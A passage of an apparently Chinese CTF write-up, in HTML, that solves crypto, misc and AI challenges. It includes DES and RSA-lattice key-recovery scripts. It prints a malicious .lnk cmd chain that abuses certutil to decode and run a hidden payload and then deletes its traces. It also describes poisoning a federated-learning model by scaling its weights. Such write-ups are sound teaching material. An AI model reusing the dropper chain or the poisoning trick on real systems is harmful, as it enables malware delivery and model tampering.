function_">getPC2_DiscardedBits</span>():</span><br><span class="line">    temp = [i <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">64</span>)]</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> PC2:</span><br><span class="line">        temp.remove(i)</span><br><span class="line">    <span class="keyword">return</span> temp</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">ReductionKey</span>(<span class="params">sub_key, <span class="built_in">round</span></span>):</span><br><span class="line">    sub_key_l = sub_key[:<span class="built_in">len</span>(sub_key) // <span class="number">2</span>]</span><br><span class="line">    sub_key_r = sub_key[<span class="built_in">len</span>(sub_key) // <span class="number">2</span>:]</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">round</span>, -<span class="number">1</span>, -<span class="number">1</span>):</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(movenum[i]):</span><br><span class="line">            <span class="comment"># 循环右移</span></span><br><span class="line">            sub_key_l = sub_key_l[-<span class="number">1</span>:] + sub_key_l[:-<span class="number">1</span>]</span><br><span class="line">            sub_key_r = sub_key_r[-<span class="number">1</span>:] + sub_key_r[:-<span class="number">1</span>]</span><br><span class="line">    <span class="keyword">return</span> sub_key_l + sub_key_r</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">r&#x27;cipher&#x27;</span>, <span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    cipher = f.read()</span><br><span class="line"></span><br><span class="line">cipher_list = <span class="built_in">list</span>(cipher)</span><br><span class="line"></span><br><span class="line">RE_PC2 = getRE_PC2()</span><br><span class="line">PC1_DiscardedBits = getPC1_DiscardedBits()</span><br><span class="line">PC2_DiscardedBits = getPC2_DiscardedBits()</span><br><span class="line"></span><br><span class="line">temp_sub_key = [<span class="number">0</span>] * <span class="number">56</span></span><br><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(PC2)):</span><br><span class="line">    temp_sub_key[PC2[j]] = key10[j]</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2</span>**<span class="number">8</span>):</span><br><span class="line">    restore_bits = <span class="built_in">list</span>(<span class="built_in">int</span>(j, <span class="number">2</span>) <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">bin</span>(i)[<span class="number">2</span>:])</span><br><span class="line">    restore_bits = [<span class="number">0</span>] * (<span class="number">8</span> - <span class="built_in">len</span>(restore_bits)) + restore_bits</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(restore_bits)):</span><br><span class="line">        temp_sub_key[PC2_DiscardedBits[j]] = restore_bits[j]</span><br><span class="line"></span><br><span class="line">    temp_sub_key1 = ReductionKey(temp_sub_key, <span class="number">10</span>)</span><br><span class="line"></span><br><span class="line">    temp_key = [<span class="number">0</span>] * <span class="number">64</span></span><br><span class="line">    <span class="keyword">for</span> index, j <span class="keyword">in</span> <span class="built_in">enumerate</span>(PC1):</span><br><span class="line">        temp_key[j] = temp_sub_key1[index]</span><br><span class="line"></span><br><span class="line">    key = <span class="built_in">bytes</span>()</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>):</span><br><span class="line">        dig = <span class="number">0</span></span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>):</span><br><span class="line">            dig = dig * <span class="number">2</span> + temp_key[i * <span class="number">8</span> + j]</span><br><span class="line">        key += dig.to_bytes(<span class="number">1</span>, <span class="string">&#x27;big&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    d = pyDes.des(key)</span><br><span class="line">    flag = d.decrypt(cipher)</span><br><span class="line">    <span class="keyword">if</span> (<span class="string">b&#x27;flag&#x27;</span> <span class="keyword">in</span> flag):</span><br><span class="line">        <span class="built_in">print</span>(flag)</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h2 id="lattice"><a href="#lattice" class="headerlink" title="lattice"></a>lattice</h2><p><a target="_blank" rel="noopener" href="https://www.ijcsi.org/papers/IJCSI-9-2-1-311-314.pdf">https://www.ijcsi.org/papers/IJCSI-9-2-1-311-314.pdf</a></p>
<p>solve</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># sage</span></span><br><span class="line">e_0 = </span><br><span class="line">n_0 = </span><br><span class="line">c_0 = </span><br><span class="line"></span><br><span class="line">e_1 = </span><br><span class="line">n_1 = </span><br><span class="line">c_1 = </span><br><span class="line"></span><br><span class="line">e_2 = </span><br><span class="line">n_2 = </span><br><span class="line">c_2 = </span><br><span class="line">n = [n_0, n_1, n_2]</span><br><span class="line">e = [e_0, e_1, e_2]</span><br><span class="line">c = [c_0, c_1, c_2]</span><br><span class="line">M = isqrt(<span class="built_in">max</span>(n))</span><br><span class="line">A = Matrix(ZZ, <span class="built_in">len</span>(e) + <span class="number">1</span>, <span class="built_in">len</span>(e) + <span class="number">1</span>)</span><br><span class="line">A[<span class="number">0</span>] = [M] + e</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(e)):</span><br><span class="line">    A[i + <span class="number">1</span>, i + <span class="number">1</span>] = -n[i]</span><br><span class="line">AL = A.BKZ()</span><br><span class="line">d = AL[<span class="number">0</span>, <span class="number">0</span>] // M</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">bytes</span>.fromhex(<span class="built_in">hex</span>(<span class="built_in">pow</span>(c[<span class="number">0</span>], d, n[<span class="number">0</span>]))[<span class="number">2</span>:]))</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h1 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h1><h2 id="ez-txt"><a href="#ez-txt" class="headerlink" title="ez_txt"></a>ez_txt</h2><p>下载解压flag.cab压缩包，得文件flag.txt.lnk</p>
<p>使用2进制查看器查看flag.txt.lnk，得cmd命令，经整理后如下所示：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">/c copy &quot;flag.txt.lnk&quot; %temp%\\fieao.tmp /y&amp; </span><br><span class="line">for /r C:\\Windows\\System32\\ %i in (*ertu*.exe) do copy %i %temp%\\reqno.exe /y&amp; </span><br><span class="line">findstr.exe &quot;TVNDRgAAAA&quot; %temp%\\fieao.tmp &gt; %temp%\\erqrer.tmp&amp; </span><br><span class="line">%temp%\\reqno.exe -decode %temp%\\erqrer.tmp %temp%\\reqrqenre.tmp&amp; </span><br><span class="line">expand %temp%\\reqrqenre.tmp -F:* %temp%&amp; </span><br><span class="line">del %temp%\\fieao.tmp %temp%\\reqno.exe %temp%\\erqrer.tmp %temp%\\reqrqenre.tmp&amp; </span><br><span class="line">%temp%\\daifei.exe&amp; wscript %temp%\\farenfeqwr.vbs C:\Users\Public\&amp; </span><br><span class="line">del %temp%\\daifei.exe %temp%\\temp %temp%\\farenfeqwr.vbs&amp; </span><br><span class="line">echo ZmxhZ3tmYWtlRmxhZ30= &gt; %temp%\\tmp.txt&amp; notepad %temp%\\tmp.txt</span><br></pre></td></tr></table></figure>

<p>可见其功能如下：</p>
<blockquote>
<ol>
<li>将自身复制为%temp%目录下的 fieao.tmp 文件</li>
<li>提取并解码自身载荷</li>
<li>解压提取载荷，释放文件</li>
<li>执行vbs脚本并清理目录</li>
<li>显示错误flag</li>
</ol>
</blockquote>
<p>按以上操作所恢复出的载荷如下：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">daifei.exe</span><br><span class="line">farenfeqwr.vbs</span><br><span class="line">temp</span><br></pre></td></tr></table></figure>

<p>其中文件功能为</p>
<ul>
<li><strong>daifei.exe</strong> : 将temp文件每1字节异或10混淆</li>
<li><strong>farenfeqwr.vbs</strong> : 拆分混淆后的vbs文件为3份并存储至C:\Users\Public目录下</li>
<li><strong>temp</strong> : 包含有flag文件的压缩包</li>
</ul>
<p>按以上步骤，便可写出相应脚本恢复 temp 文件，temp文件为去除文件头的zip压缩包，须补全文件头后恢复伪加密，便可恢复出如下文件：</p>
<ul>
<li><strong>encrypted.flag</strong> : 经由RSA加密后的flag文件，包含由不同公钥加密的flag字符串</li>
<li><strong>user1_rsa.pub</strong> : RSA公钥1</li>
<li><strong>user2_rsa.pub</strong> : RSA公钥2</li>
</ul>
<p>读取RSA公钥文件，发现其模数相同，便可知为共模攻击，按共模攻击构建脚本解密，可得 flag 为：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;c3da-bfca-dc68-cbf9&#125;</span><br></pre></td></tr></table></figure>

<h2 id="Ezai"><a href="#Ezai" class="headerlink" title="Ezai"></a>Ezai</h2><p>联邦学习攻击，本地存了一个学习次数相当少的模型，需要选手上传一个模型，poly.py对模型进行“平均聚合”后测试正确率，超过98%就给 flag</p>
<p>这里<code>training.py</code>文件的run函数后面被注掉了</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">run</span>(<span class="params">hlpr</span>):</span><br><span class="line">    acc = test(hlpr, <span class="number">0</span>, backdoor=<span class="literal">False</span>) <span class="comment">#测试模型成功率</span></span><br><span class="line">    <span class="comment">#print(acc)</span></span><br><span class="line">    <span class="keyword">if</span>(acc&gt;<span class="number">98</span>):</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;flag&#123;da3764e9c0be1684dd6c7155fba65485&#125;&#x27;</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">str</span>(acc);</span><br><span class="line">    <span class="comment"># for epoch in range(hlpr.params.start_epoch,</span></span><br><span class="line">    <span class="comment">#                    hlpr.params.epochs + 1):</span></span><br><span class="line">    <span class="comment">#     ##delete</span></span><br><span class="line">    <span class="comment">#     # if(epoch==2):</span></span><br><span class="line">    <span class="comment">#     #     break</span></span><br><span class="line">    <span class="comment">#     ##</span></span><br><span class="line">    <span class="comment">#     train(hlpr, epoch, hlpr.task.model, hlpr.task.optimizer,</span></span><br><span class="line">    <span class="comment">#           hlpr.task.train_loader)</span></span><br><span class="line">    <span class="comment">#     acc = test(hlpr, epoch, backdoor=False)</span></span><br><span class="line">    <span class="comment">#     # test(hlpr, epoch, backdoor=True)</span></span><br><span class="line">    <span class="comment">#     hlpr.save_model(hlpr.task.model, epoch, acc)</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">#hlpr.save_model(hlpr.task.model, 0, acc)</span></span><br></pre></td></tr></table></figure>

<p>选手只要把注释去掉就可以进行训练，训练两分钟左右就可以实现超过99%的正确率，并获取模型文件</p>
<p>但是这样直接上传的正确率并不会到达98%</p>
<p>因为这个测试使用的是“平均聚合”，所以只需要把本地生成模型的所有值都乘一个大数（如100），再上传就可以实现高成功率。</p>
<p>而这个处理模型文件的文件就是<code>poly.py</code>，只要改一下这个文件的参数，就可以实现了，理论上并不需要书写代码。</p>
<h2 id="Empty-maze"><a href="#Empty-maze" class="headerlink" title="Empty_maze"></a>Empty_maze</h2><p>这是一道迷宫题，给大家放松一下</p>
<p>题目灵感为清华大学主办的TQLCTF2021中的一道迷宫题以及：</p>
<p><a target="_blank" rel="noopener" href="https://www.bilibili.com/video/BV1hy4y1k7k4/?share_source=copy_web&vd_source=1367e9e3a081b45461e099b284e7c33d">https://www.bilibili.com/video/BV1hy4y1k7k4/?share_source=copy_web&amp;vd_source=1367e9e3a081b45461e099b284e7c33d</a></p>
<p>我用python写了一个简单版的实现，代码会在后文放出 </p>
<p>大体思路是每一个格子都有自己的高度，只能由高向低走不能反过来走，反走会扣一点hp  </p>
<p>当然也可以用单向门这个概念来理解</p>
<p>每从高向低走一步会触发一个click</p>
<p>进而我发现或许可以通过是否减少hp和是否click来判断当前位置，因而hard难度我就把位置标记去掉了</p>
<p>在题目中有一些有趣的坑比如：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">2 2 2 2  </span><br><span class="line">2 1 1 2  </span><br><span class="line">2 2 2 2  </span><br></pre></td></tr></table></figure>

<p>一旦掉进去就出不来</p>
<p>具体代码如下：</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#map=[0sizex,1sizey,2posx,3posy,4tarx,5tary,6hp,7map]</span></span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="comment">#地图</span></span><br><span class="line">babymap1 = [<span class="number">10</span>,<span class="number">10</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">9</span>,<span class="number">9</span>,<span class="number">100</span>,</span><br><span class="line">[</span><br><span class="line">    [<span class="number">5</span>,<span class="number">5</span>,<span class="number">4</span>,<span class="number">4</span>,<span class="number">3</span>,<span class="number">3</span>,<span class="number">2</span>,<span class="number">2</span>,<span class="number">1</span>,<span class="number">1</span>],</span><br><span class="line">    [<span class="number">5</span>,<span class="number">5</span>,<span class="number">4</span>,<span class="number">4</span>,<span class="number">3</span>,<span class="number">3</span>,<span class="number">2</span>,<span class="number">2</span>,<span class="number">1</span>,<span class="number">1</span>],</span><br><span class="line">    [<span class="number">5</span>,<span class="number">5</span>,<span class="number">4</span>,<span class="number">4</span>,<span class="number">3</span>,<span class="number">3</span>,<span class="number">2</span>,<span class="number">2</span>,<span class="number">1</span>,<span class="number">1</span>],</span><br><span class="line">    [<span class="number">5</span>,<span class="number">5</span>,<span class="number">4</span>,<span class="number">4</span>,<span class="number">3</span>,<span class="number">3</span>,<span class="number">2</span>,<span class="number">2</span>,<span class="number">1</span>,<span class="number">1</span>],</span><br><span class="line">    [<span class="number">5</span>,<span class="number">5</span>,<span class="number">4</span>,<span class="number">4</span>,<span class="number">3</span>,<span class="number">3</span>,<span class="number">2</span>,<span class="number">2</span>,<span class="number">1</span>,<span class="number">1</span>],</span><br><span class="line">    [<span class="number">5</span>,<span class="number">5</span>,<span class="number">4</span>,<span class="number">4</span>,<span class="number">3</span>,<span class="number">3</span>,<span class="number">2</span>,<span class="number">2</span>,<span class="number">1</span>,<span class="number">1</span>],</span><br><span class="line">    [<span class="number">5</span>,<span class="number">5</span>,<span class="number">4</span>,<span class="number">4</span>,<span class="number">3</span>,<span class="number">3</span>,<span class="number">2</span>,<span class="number">2</span>,<span class="number">1</span>,<span class="number">1</span>],</span><br><span class="line">    [<span class="number">5</span>,<span class="number">5</span>,<span class="number">4</span>,<span class="number">4</span>,<span class="number">3</span>,<span class="number">3</span>,<span class="number">2</span>,<span class="number">2</span>,<span class="number">1</span>,<span class="number">1</span>],</span><br><span class="line">    [<span class="number">5</span>,<span class="number">5</span>,<span class="number">4</span>,<span class="number">4</span>,<span class="number">3</span>,<span class="number">3</span>,<span class="number">2</span>,<span class="number">2</span>,<span class="number">1</span>,<span class="number">1</span>],</span><br><span class="line">    [<span class="number">5</span>,<span class="number">5</span>,<span class="number">4</span>,<span class="number">4</span>,<span class="number">3</span>,<span class="number">3</span>,<span class="number">2</span>,<span class="number">2</span>,<span class="number">1</span>,<span class="number">1</span>]</span><br><span class="line"></span><br><span class="line">]</span><br><span class="line">]</span><br><span class="line"></span><br><span class="line">babymap2 = [<span class="number">10</span>,<span class="number">10</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">9</span>,<span class="number">9</span>,<span class="number">100</span>,</span><br><span class="line">[</span><br><span class="line">    [<span class="number">5</span>,<span class="number">5</span>,<span class="number">5</span>,<span class="number">5</span>,<span class="number">3</span>,<span class="number">3</span>,<span class="number">5</span>,<span class="number">2</span>,<span class="number">1</span>,<span class="number">1</span>],</span><br><span class="line">    [<span class="number">6</span>,<span class="number">4</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">3</span>,<span class="number">3</span>,<span class="number">5</span>,<span class="number">2</span>,<span class="number">1</span>,<span class="number">1</span>],</span><br><span class="line">    [<span class="number">5</span>,<span class="number">4</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">3</span>,<span class="number">3</span>,<span class="number">5</span>,<span class="number">2</span>,<span class="number">1</span>,<span class="number">1</span>],</span><br><span class="line">    [<span class="number">5</span>,<span class="number">4</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">3</span>,<span class="number">3</span>,<span class="number">2</span>,<span class="number">2</span>,<span class="number">1</span>,<span class="number">1</span>],</span><br><span class="line">    [<span class="number">5</span>,<span class="number">4</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">5</span>,<span class="number">3</span>,<span class="number">2</span>,<span class="number">2</span>,<span class="number">1</span>,<span class="number">1</span>],</span><br><span class="line">    [<span class="number">5</span>,<span class="number">4</span>,<span class="number">4</span>,<span class="number">4</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">5</span>,<span class="number">5</span>,<span class="number">5</span>,<span class="number">5</span>],</span><br><span class="line">    [<span class="number">5</span>,<span class="number">5</span>,<span class="number">5</span>,<span class="number">5</span>,<span class="number">3</span>,<span class="number">3</span>,<span class="number">2</span>,<span class="number">2</span>,<span class="number">1</span>,<span class="number">1</span>],</span><br><span class="line">    [<span class="number">0</span>,<span class="number">0</span>,<span class="number">5</span>,<span class="number">3</span>,<span class="number">3</span>,<span class="number">3</span>,<span class="number">3</span>,<span class="number">3</span>,<span class="number">2</span>,<span class="number">1</span>],</span><br><span class="line">    [<span class="number">0</span>,<span class="number">5</span>,<span class="number">3</span>,<span class="number">3</span>,<span class="number">5</span>,<span class="number">5</span>,<span class="number">5</span>,<span class="number">5</span>,<span class="number">5</span>,<span class="number">5</span>],</span><br><span class="line">    [<span class="number">0</span>,<span class="number">0</span>,<span class="number">3</span>,<span class="number">3</span>,<span class="number">3</span>,<span class="number">3</span>,<span class="number">2</span>,<span class="number">2</span>,<span class="number">1</span>,<span class="number">1</span>]</span><br><span class="line"></span><br><span class="line">]</span><br><span class="line">]</span><br><span class="line"></span><br><span class="line">babymap3 = [<span class="number">10</span>,<span class="number">10</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">9</span>,<span class="number">9</span>,<span class="number">100</span>,</span><br><span class="line">[</span><br><span class="line">    [<span class="number">5</span>,<span class="number">5</span>,<span class="number">6</span>,<span class="number">5</span>,<span class="number">3</span>,<span class="number">3</span>,<span class="number">2</span>,<span class="number">2</span>,<span class="number">1</span>,<span class="number">1</span>],</span><br><span class="line">    [<span class="number">5</span>,<span class="number">5</span>,<span class="number">5</span>,<span class="number">5</span>,<span class="number">6</span>,<span class="number">3</span>,<span class="number">2</span>,<span class="number">2</span>,<span class="number">1</span>,<span class="number">1</span>],</span><br><span class="line">    [<span class="number">5</span>,<span class="number">6</span>,<span class="number">5</span>,<span class="number">5</span>,<span class="number">6</span>,<span class="number">5</span>,<span class="number">2</span>,<span class="number">2</span>,<span class="number">5</span>,<span class="number">5</span>],</span><br><span class="line">    [<span class="number">5</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">6</span>,<span class="number">3</span>,<span class="number">5</span>,<span class="number">2</span>,<span class="number">2</span>,<span class="number">1</span>,<span class="number">1</span>],</span><br><span class="line">    [<span class="number">5</span>,<span class="number">4</span>,<span class="number">4</span>,<span class="number">4</span>,<span class="number">3</span>,<span class="number">3</span>,<span class="number">5</span>,<span class="number">5</span>,<span class="number">5</span>,<span class="number">5</span>],</span><br><span class="line">    [<span class="number">5</span>,<span class="number">5</span>,<span class="number">4</span>,<span class="number">4</span>,<span class="number">4</span>,<span class="number">4</span>,<span class="number">4</span>,<span class="number">4</span>,<span class="number">4</span>,<span class="number">4</span>],</span><br><span class="line">    [<span class="number">5</span>,<span class="number">5</span>,<span class="number">6</span>,<span class="number">6</span>,<span class="number">3</span>,<span class="number">3</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">4</span>,<span class="number">4</span>],</span><br><span class="line">    [<span class="number">2</span>,<span class="number">2</span>,<span class="number">2</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">3</span>,<span class="number">0</span>,<span class="number">2</span>,<span class="number">6</span>,<span class="number">6</span>],</span><br><span class="line">    [<span class="number">2</span>,<span class="number">3</span>,<span class="number">2</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">3</span>,<span class="number">2</span>,<span class="number">2</span>,<span class="number">1</span>,<span class="number">1</span>],</span><br><span class="line">    [<span class="number">2</span>,<span class="number">2</span>,<span class="number">2</span>,<span class="number">2</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">1</span>]</span><br><span class="line"></span><br><span class="line">]</span><br><span class="line">]</span><br><span class="line"></span><br><span class="line">babymap4 = [<span class="number">10</span>,<span class="number">10</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">9</span>,<span class="number">9</span>,<span class="number">35</span>,</span><br><span class="line">[</span><br><span class="line">    [<span class="number">5</span>,<span class="number">5</span>,<span class="number">5</span>,<span class="number">5</span>,<span class="number">3</span>,<span class="number">3</span>,<span class="number">5</span>,<span class="number">2</span>,<span class="number">1</span>,<span class="number">1</span>],</span><br><span class="line">    [<span class="number">6</span>,<span class="number">4</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">3</span>,<span class="number">3</span>,<span class="number">5</span>,<span class="number">2</span>,<span class="number">1</span>,<span class="number">1</span>],</span><br><span class="line">    [<span class="number">5</span>,<span class="number">4</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">3</span>,<span class="number">3</span>,<span class="number">5</span>,<span class="number">2</span>,<span class="number">1</span>,<span class="number">1</span>],</span><br><span class="line">    [<span class="number">5</span>,<span class="number">4</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">3</span>,<span class="number">3</span>,<span class="number">2</span>,<span class="number">2</span>,<span class="number">1</span>,<span class="number">1</span>],</span><br><span class="line">    [<span class="number">5</span>,<span class="number">4</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">5</span>,<span class="number">3</span>,<span class="number">2</span>,<span class="number">2</span>,<span class="number">1</span>,<span class="number">1</span>],</span><br><span class="line">    [<span class="number">5</span>,<span class="number">4</span>,<span class="number">4</span>,<span class="number">4</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">5</span>,<span class="number">5</span>,<span class="number">5</span>,<span class="number">5</span>],</span><br><span class="line">    [<span class="number">5</span>,<span class="number">5</span>,<span class="number">5</span>,<span class="number">5</span>,<span class="number">3</span>,<span class="number">3</span>,<span class="number">2</span>,<span class="number">2</span>,<span class="number">1</span>,<span class="number">1</span>],</span><br><span class="line">    [<span class="number">0</span>,<span class="number">0</span>,<span class="number">5</span>,<span class="number">3</span>,<span class="number">3</span>,<span class="number">3</span>,<span class="number">3</span>,<span class="number">3</span>,<span class="number">2</span>,<span class="number">1</span>],</span><br><span class="line">    [<span class="number">0</span>,<span class="number">5</span>,<span class="number">3</span>,<span class="number">3</span>,<span class="number">5</span>,<span class="number">5</span>,<span class="number">5</span>,<span class="number">5</span>,<span class="number">5</span>,<span class="number">5</span>],</span><br><span class="line">    [<span class="number">0</span>,<span class="number">0</span>,<span class="number">3</span>,<span class="number">3</span>,<span class="number">3</span>,<span class="number">3</span>,<span class="number">2</span>,<span class="number">2</span>,<span class="number">1</span>,<span class="number">1</span>]</span><br><span class="line"></span><br><span class="line">]</span><br><span class="line">]</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">cls</span>():</span><br><span class="line">    os.system(<span class="string">&#x27;cls&#x27;</span>)</span><br><span class="line">    <span 